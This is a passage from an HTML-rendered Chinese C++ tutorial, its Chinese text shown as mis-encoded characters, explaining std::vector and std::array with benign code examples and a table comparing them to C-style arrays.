ã€‚</li><li>  <strong>è¾¹ç•Œæ£€æŸ¥ (å¯é€‰):</strong> æä¾› <code>at()</code> æˆå‘˜å‡½æ•°è¿›è¡Œå¸¦è¾¹ç•Œæ£€æŸ¥çš„å…ƒç´ è®¿é—®ã€‚</li><li>  <strong>ä¸°å¯Œçš„æˆå‘˜å‡½æ•°:</strong> æä¾› <code>push_back()</code>, <code>pop_back()</code>, <code>size()</code>, <code>empty()</code>, <code>clear()</code>, <code>insert()</code>, <code>erase()</code> ç­‰å¤šç§æ–¹ä¾¿çš„æ“ä½œã€‚</li><li>  <strong>æ¨¡æ¿ç±»:</strong> <code>vector</code> æ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œéœ€è¦æŒ‡å®šå­˜å‚¨çš„å…ƒç´ ç±»å‹ï¼Œä¾‹å¦‚ <code>std::vector&lt;int&gt;</code>, <code>std::vector&lt;double&gt;</code>, <code>std::vector&lt;std::string&gt;</code>ã€‚</li></ul><p><strong>ä½¿ç”¨æ–¹æ³•:</strong></p><ol><li> <strong>åŒ…å«å¤´æ–‡ä»¶:</strong> <code>#include &lt;vector&gt;</code></li><li><strong>å£°æ˜å’Œåˆå§‹åŒ–:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; scores; <span class="comment">// åˆ›å»ºä¸€ä¸ªç©ºçš„ int vector</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; <span class="title">lengths</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// åˆ›å»ºåŒ…å« 10 ä¸ª double å…ƒç´ çš„ vector (é»˜è®¤åˆå§‹åŒ–ä¸º 0.0)</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="title">names</span><span class="params">(<span class="number">5</span>, <span class="string">&quot;Unknown&quot;</span>)</span></span>; <span class="comment">// åˆ›å»ºåŒ…å« 5 ä¸ª string å…ƒç´ ï¼Œéƒ½åˆå§‹åŒ–ä¸º &quot;Unknown&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 åˆ—è¡¨åˆå§‹åŒ–</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; primes &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>&#125;; <span class="comment">// åˆ›å»ºå¹¶åˆå§‹åŒ–</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; vowels &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>è®¿é—®å…ƒç´ :</strong><ul><li>  <code>[]</code> è¿ç®—ç¬¦: <code>scores[0]</code>, <code>names[i]</code> (ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥)ã€‚</li><li>  <code>at()</code> å‡½æ•°: <code>scores.at(0)</code>, <code>names.at(i)</code> (è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œè¶Šç•ŒæŠ›å‡º <code>std::out_of_range</code> å¼‚å¸¸)ã€‚</li></ul></li><li><strong>å¸¸ç”¨æ“ä½œ:</strong><ul><li>  <code>push_back(value)</code>: åœ¨ <code>vector</code> æœ«å°¾æ·»åŠ ä¸€ä¸ªå…ƒç´ ã€‚</li><li>  <code>size()</code>: è¿”å› <code>vector</code> ä¸­å…ƒç´ çš„æ•°é‡ã€‚</li><li>  <code>empty()</code>: æ£€æŸ¥ <code>vector</code> æ˜¯å¦ä¸ºç©ºã€‚</li><li>  <code>clear()</code>: ç§»é™¤æ‰€æœ‰å…ƒç´ ã€‚</li><li>  <code>pop_back()</code>: ç§»é™¤æœ«å°¾çš„å…ƒç´ ã€‚</li></ul></li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºå’Œåˆå§‹åŒ–</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers; <span class="comment">// ç©º vector</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; tasks &#123;<span class="string">&quot;Read&quot;</span>, <span class="string">&quot;Write&quot;</span>, <span class="string">&quot;Code&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ·»åŠ å…ƒç´ </span></span><br><span class="line">    numbers.push_back(<span class="number">10</span>); <span class="comment">// numbers: &#123;10&#125;</span></span><br><span class="line">    numbers.push_back(<span class="number">20</span>); <span class="comment">// numbers: &#123;10, 20&#125;</span></span><br><span class="line">    numbers.push_back(<span class="number">30</span>); <span class="comment">// numbers: &#123;10, 20, 30&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®å…ƒç´ </span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First number: &quot;</span> &lt;&lt; numbers[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second task: &quot;</span> &lt;&lt; tasks.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Write</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; tasks.at(3); // ä¼šæŠ›å‡ºå¼‚å¸¸</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿®æ”¹å…ƒç´ </span></span><br><span class="line">    numbers[<span class="number">0</span>] = <span class="number">15</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¤§å°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of tasks: &quot;</span> &lt;&lt; tasks.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå† vector (C++11 åŸºäºèŒƒå›´çš„ for å¾ªç¯)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : numbers) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Numbers: 15 20 30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå† vector (ä¼ ç»Ÿ for å¾ªç¯)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Tasks:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; tasks.size(); ++i) &#123; <span class="comment">// ä½¿ç”¨ size_t ä½œä¸ºç´¢å¼•ç±»å‹</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; tasks[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Tasks: Read Write Code</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç§»é™¤æœ«å°¾å…ƒç´ </span></span><br><span class="line">    numbers.pop_back(); <span class="comment">// numbers: &#123;15, 20&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Last number after pop: &quot;</span> &lt;&lt; numbers.back() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// back() è®¿é—®æœ€åä¸€ä¸ªå…ƒç´ </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::vector</code> æ˜¯ C++ ä¸­æ›¿ä»£åŠ¨æ€æ•°ç»„çš„é¦–é€‰æ–¹æ¡ˆï¼Œå› ä¸ºå®ƒæ›´å®‰å…¨ã€æ›´æ˜“äºç®¡ç†ã€‚</p><h3 id="4-10-2-æ¨¡æ¿ç±»arrayï¼ˆC-11ï¼‰"><a href="#4-10-2-æ¨¡æ¿ç±»arrayï¼ˆC-11ï¼‰" class="headerlink" title="4.10.2 æ¨¡æ¿ç±»arrayï¼ˆC++11ï¼‰"></a>4.10.2 æ¨¡æ¿ç±»arrayï¼ˆC++11ï¼‰</h3><p>C++11 å¼•å…¥äº† <code>std::array</code> æ¨¡æ¿ç±»ï¼Œå®ƒå°è£…äº†<strong>å›ºå®šå¤§å°</strong>çš„æ•°ç»„ã€‚ä¸ C é£æ ¼æ•°ç»„ç±»ä¼¼ï¼Œå…¶å¤§å°åœ¨ç¼–è¯‘æ—¶ç¡®å®šï¼Œä½†å®ƒæä¾›äº†æ›´ç°ä»£çš„æ¥å£å’Œä¸€äº› <code>vector</code> å…·æœ‰çš„ä¾¿åˆ©æ€§ï¼ˆå¦‚ <code>size()</code>, <code>at()</code>ï¼‰ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ul><li>  <strong>å›ºå®šå¤§å°:</strong> æ•°ç»„å¤§å°å¿…é¡»åœ¨ç¼–è¯‘æ—¶æŒ‡å®šä¸ºæ¨¡æ¿å‚æ•°ï¼Œä¹‹åä¸èƒ½æ”¹å˜ã€‚</li><li>  <strong>å†…å­˜ä½ç½®:</strong> é€šå¸¸åœ¨æ ˆä¸Šåˆ†é…å†…å­˜ï¼ˆå¦‚æœä½œä¸ºå±€éƒ¨å˜é‡å£°æ˜ï¼‰ï¼Œä¸ C é£æ ¼æ•°ç»„ç±»ä¼¼ï¼Œé™¤éæ˜¾å¼ä½¿ç”¨ <code>new</code> åˆ›å»ºã€‚</li><li>  <strong>ç±»å‹å®‰å…¨:</strong> å¤§å°æ˜¯ç±»å‹çš„ä¸€éƒ¨åˆ† (<code>std::array&lt;int, 5&gt;</code> å’Œ <code>std::array&lt;int, 10&gt;</code> æ˜¯ä¸åŒçš„ç±»å‹)ã€‚</li><li>  <strong>STL æ¥å£:</strong> æä¾›ä¸ <code>vector</code> ç±»ä¼¼çš„æ¥å£ï¼Œå¦‚ <code>size()</code>, <code>empty()</code>, <code>at()</code>, <code>[]</code>, <code>front()</code>, <code>back()</code>ï¼Œä»¥åŠè¿­ä»£å™¨æ”¯æŒï¼Œå¯ä»¥æ–¹ä¾¿åœ°ä¸ STL ç®—æ³•ä¸€èµ·ä½¿ç”¨ã€‚</li><li>  <strong>æ— å¼€é”€æŠ½è±¡:</strong> é€šå¸¸ä¸ä¼šæ¯” C é£æ ¼æ•°ç»„å¸¦æ¥é¢å¤–çš„è¿è¡Œæ—¶æ€§èƒ½å¼€é”€ã€‚</li><li>  <strong>æ¨¡æ¿ç±»:</strong> éœ€è¦æŒ‡å®šå…ƒç´ ç±»å‹å’Œå¤§å°ï¼Œä¾‹å¦‚ <code>std::array&lt;int, 10&gt;</code>, <code>std::array&lt;double, 3&gt;</code>ã€‚</li></ul><p><strong>ä½¿ç”¨æ–¹æ³•:</strong></p><ol><li> <strong>åŒ…å«å¤´æ–‡ä»¶:</strong> <code>#include &lt;array&gt;</code></li><li><strong>å£°æ˜å’Œåˆå§‹åŒ–:</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 5&gt; scores; <span class="comment">// åˆ›å»ºåŒ…å« 5 ä¸ª int çš„ array (å…ƒç´ å€¼æœªå®šä¹‰ï¼Œé™¤éæ˜¯é™æ€å­˜å‚¨)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, 3&gt; coords &#123;&#125;; <span class="comment">// åˆ›å»ºåŒ…å« 3 ä¸ª double çš„ array, é›¶åˆå§‹åŒ– &#123;0.0, 0.0, 0.0&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C++11 åˆ—è¡¨åˆå§‹åŒ–</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 4&gt; values &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;; <span class="comment">// åˆ›å»ºå¹¶åˆå§‹åŒ–</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, 2&gt; names &#123;<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ³¨æ„: åˆå§‹åŒ–åˆ—è¡¨çš„å…ƒç´ æ•°é‡ä¸èƒ½è¶…è¿‡ array çš„å¤§å°</span></span><br><span class="line"><span class="comment">// std::array&lt;int, 3&gt; errors &#123;1, 2, 3, 4&#125;; // é”™è¯¯!</span></span><br><span class="line"><span class="comment">// å¦‚æœå…ƒç´ æ•°é‡å°‘äº array å¤§å°ï¼Œå‰©ä½™å…ƒç´ ä¼šè¢«å€¼åˆå§‹åŒ– (é€šå¸¸ä¸º 0)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 5&gt; partial &#123;<span class="number">10</span>, <span class="number">20</span>&#125;; <span class="comment">// &#123;10, 20, 0, 0, 0&#125;</span></span><br></pre></td></tr></table></figure></li><li><strong>è®¿é—®å…ƒç´ :</strong><ul><li>  <code>[]</code> è¿ç®—ç¬¦: <code>scores[0]</code>, <code>names[i]</code> (ä¸è¿›è¡Œè¾¹ç•Œæ£€æŸ¥)ã€‚</li><li>  <code>at()</code> å‡½æ•°: <code>scores.at(0)</code>, <code>names.at(i)</code> (è¿›è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œè¶Šç•ŒæŠ›å‡º <code>std::out_of_range</code> å¼‚å¸¸)ã€‚</li></ul></li><li><strong>å¸¸ç”¨æ“ä½œ:</strong><ul><li>  <code>size()</code>: è¿”å›æ•°ç»„çš„å¤§å°ï¼ˆç¼–è¯‘æ—¶å¸¸é‡ï¼‰ã€‚</li><li>  <code>empty()</code>: æ£€æŸ¥æ•°ç»„æ˜¯å¦ä¸ºç©ºï¼ˆå¯¹äºå¤§å° &gt; 0 çš„ <code>std::array</code> æ€»æ˜¯è¿”å› <code>false</code>ï¼‰ã€‚</li><li>  <code>fill(value)</code>: å°†æ‰€æœ‰å…ƒç´ è®¾ç½®ä¸ºæŒ‡å®šå€¼ã€‚</li><li>  <code>front()</code>: è®¿é—®ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</li><li>  <code>back()</code>: è®¿é—®æœ€åä¸€ä¸ªå…ƒç´ ã€‚</li></ul></li></ol><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;array&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;numeric&gt; // ä¸ºäº† std::accumulate</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºå’Œåˆå§‹åŒ–</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">int</span>, 5&gt; data &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, 3&gt; colors &#123;<span class="string">&quot;Red&quot;</span>, <span class="string">&quot;Green&quot;</span>, <span class="string">&quot;Blue&quot;</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;<span class="keyword">double</span>, 4&gt; temps &#123;&#125;; <span class="comment">// &#123;0.0, 0.0, 0.0, 0.0&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¿é—®å…ƒç´ </span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First data element: &quot;</span> &lt;&lt; data[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second color: &quot;</span> &lt;&lt; colors.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Green</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;A temperature: &quot;</span> &lt;&lt; temps[<span class="number">2</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¤§å°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of data array: &quot;</span> &lt;&lt; data.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¡«å……</span></span><br><span class="line">    temps.fill(<span class="number">25.5</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Filled temperature: &quot;</span> &lt;&lt; temps[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 25.5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå† (C++11 åŸºäºèŒƒå›´çš„ for å¾ªç¯)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Colors:&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; color : colors) &#123; <span class="comment">// ä½¿ç”¨ const å¼•ç”¨é¿å…å¤åˆ¶</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; color;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º Colors: Red Green Blue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸ STL ç®—æ³•ä¸€èµ·ä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">double</span> sum = <span class="built_in">std</span>::accumulate(temps.begin(), temps.end(), <span class="number">0.0</span>); <span class="comment">// è®¡ç®—æ€»å’Œ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of temperatures: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::array</code> æ˜¯æ›¿ä»£éœ€è¦å›ºå®šå¤§å°æ•°ç»„çš„ C é£æ ¼æ•°ç»„çš„ç°ä»£ C++ æ–¹æ¡ˆã€‚</p><h3 id="4-10-3-æ¯”è¾ƒæ•°ç»„ã€vectorå¯¹è±¡å’Œarrayå¯¹è±¡"><a href="#4-10-3-æ¯”è¾ƒæ•°ç»„ã€vectorå¯¹è±¡å’Œarrayå¯¹è±¡" class="headerlink" title="4.10.3 æ¯”è¾ƒæ•°ç»„ã€vectorå¯¹è±¡å’Œarrayå¯¹è±¡"></a>4.10.3 æ¯”è¾ƒæ•°ç»„ã€vectorå¯¹è±¡å’Œarrayå¯¹è±¡</h3><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">C é£æ ¼æ•°ç»„ (<code>T[]</code>)</th><th align="left"><code>std::vector&lt;T&gt;</code></th><th align="left"><code>std::array&lt;T, N&gt;</code> (C++11)</th></tr></thead><tbody><tr><td align="left"><strong>å¤§å°</strong></td><td align="left">å›ºå®š (ç¼–è¯‘æ—¶ç¡®å®šæ ˆæ•°ç»„ï¼Œè¿è¡Œæ—¶ç¡®å®šå †æ•°ç»„)</td><td align="left">åŠ¨æ€ (å¯è¿è¡Œæ—¶æ”¹å˜)</td><td align="left">å›ºå®š (ç¼–è¯‘æ—¶ç¡®å®š)</td></tr><tr><td align="left"><strong>å†…å­˜åˆ†é…</strong></td><td align="left">æ ˆ (å±€éƒ¨) æˆ– é™æ€åŒº æˆ– å † (<code>new[]</code>)</td><td align="left">é€šå¸¸åœ¨å †ä¸Š (è‡ªç”±å­˜å‚¨åŒº)</td><td align="left">é€šå¸¸åœ¨æ ˆä¸Š (é™¤éç”¨ <code>new</code> åˆ›å»º)</td></tr><tr><td align="left"><strong>å¤§å°ä¿¡æ¯</strong></td><td align="left">æ— å†…ç½®æ–¹æ³•è·å–å¤§å° (éœ€å•ç‹¬ä¼ é€’)</td><td align="left"><code>size()</code> æˆå‘˜å‡½æ•°</td><td align="left"><code>size()</code> æˆå‘˜å‡½æ•° (ç¼–è¯‘æ—¶å¸¸é‡)</td></tr><tr><td align="left"><strong>è¾¹ç•Œæ£€æŸ¥</strong></td><td align="left">æ—  (ä¸å®‰å…¨)</td><td align="left"><code>at()</code> æä¾›æ£€æŸ¥, <code>[]</code> ä¸æä¾›</td><td align="left"><code>at()</code> æä¾›æ£€æŸ¥, <code>[]</code> ä¸æä¾›</td></tr><tr><td align="left"><strong>èµ‹å€¼/å¤åˆ¶</strong></td><td align="left">ä¸èƒ½ç›´æ¥èµ‹å€¼/å¤åˆ¶æ•´ä¸ªæ•°ç»„</td><td align="left">å¯ä»¥ç›´æ¥èµ‹å€¼/å¤åˆ¶ (æ·±æ‹·è´)</td><td align="left">å¯ä»¥ç›´æ¥èµ‹å€¼/å¤åˆ¶ (æˆå‘˜é€ä¸€å¤åˆ¶)</td></tr><tr><td align="left"><strong>ä½œä¸ºå‡½æ•°å‚æ•°</strong></td><td align="left">é€šå¸¸é€€åŒ–ä¸ºæŒ‡é’ˆ (ä¸¢å¤±å¤§å°ä¿¡æ¯)</td><td align="left">å¯ä»¥æŒ‰å€¼ã€å¼•ç”¨æˆ–æŒ‡é’ˆä¼ é€’</td><td align="left">å¯ä»¥æŒ‰å€¼ã€å¼•ç”¨æˆ–æŒ‡é’ˆä¼ é€’</td></tr><tr><td align="left"><strong>STL å…¼å®¹æ€§</strong></td><td align="left">æœ‰é™ (éœ€è¦æŒ‡é’ˆå’Œå¤§å°)</td><td align="left">å®Œå…¨å…¼å®¹ (æä¾›è¿­ä»£å™¨ç­‰)</td><td align="left">å®Œå…¨å…¼å®¹ (æä¾›è¿­ä»£å™¨ç­‰)</td></tr><tr><td align="left"><strong>æ€§èƒ½</strong></td><td align="left">é€šå¸¸æœ€å¿« (ç›´æ¥å†…å­˜è®¿é—®)</td><td align="left">è®¿é—®é€Ÿåº¦å¿«ï¼Œæ·»åŠ /åˆ é™¤å¯èƒ½æ¶‰åŠå†…å­˜é‡åˆ†é…</td><td align="left">é€šå¸¸ä¸ C é£æ ¼æ•°ç»„æ€§èƒ½ç›¸åŒ</td></tr><tr><td align="left"><strong>å¤´æ–‡ä»¶</strong></td><td align="left">æ— éœ€</td><td align="left"><code>&lt;vector&gt;</code></td><td align="left"><code>&lt;array&gt;</code></td></tr></tbody></table><p><strong>é€‰æ‹©å»ºè®®:</strong></p><ul><li>  <strong>éœ€è¦åŠ¨æ€å¤§å°:</strong> å¦‚æœæ•°ç»„å¤§å°åœ¨è¿è¡Œæ—¶æ‰èƒ½ç¡®å®šï¼Œæˆ–è€…éœ€è¦åœ¨ç¨‹åºè¿è¡ŒæœŸé—´æ”¹å˜å¤§å°ï¼Œ**<code>std::vector</code> æ˜¯æœ€ä½³é€‰æ‹©**ã€‚</li><li><strong>éœ€è¦å›ºå®šå¤§å° (ç¼–è¯‘æ—¶å·²çŸ¥):</strong> å¦‚æœæ•°ç»„å¤§å°åœ¨ç¼–è¯‘æ—¶å°±ç¡®å®šä¸”ä¸ä¼šæ”¹å˜ï¼š<ul><li>  **ä¼˜å…ˆé€‰æ‹© <code>std::array</code> (C++11 åŠä»¥å)**ã€‚å®ƒæä¾›äº†ä¸ C é£æ ¼æ•°ç»„ç›¸åŒçš„æ€§èƒ½å’Œå†…å­˜å¸ƒå±€ï¼ˆé€šå¸¸åœ¨æ ˆä¸Šï¼‰ï¼Œä½†å…·æœ‰æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„æ¥å£ï¼ˆå¦‚ <code>size()</code>, <code>at()</code>, 